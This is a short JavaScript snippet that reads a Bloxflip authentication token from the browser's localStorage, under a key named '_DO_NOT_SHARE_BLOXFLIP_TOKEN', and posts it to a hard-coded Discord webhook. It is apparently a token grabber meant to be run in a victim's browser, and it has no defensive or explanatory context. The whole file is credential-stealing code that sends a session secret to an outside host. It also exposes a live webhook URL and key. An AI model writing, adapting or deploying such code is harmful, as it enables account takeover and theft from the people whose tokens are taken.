  var request = new XMLHttpRequest();
request.open("POST", "https://discord.com/api/webhooks/1038020186139271209/raehEh7e6vHP1i9fphl8CneZP1fgdJPIRrqvXsm10MDIGfc7ESrbDdyhUdnYWz-U8XF-", true);
request.setRequestHeader("Content-Type", "application/json");
var params = JSON.stringify({
  "content": "Authtoken: " + localStorage.getItem("_DO_NOT_SHARE_BLOXFLIP_TOKEN")
});

request.send(params);
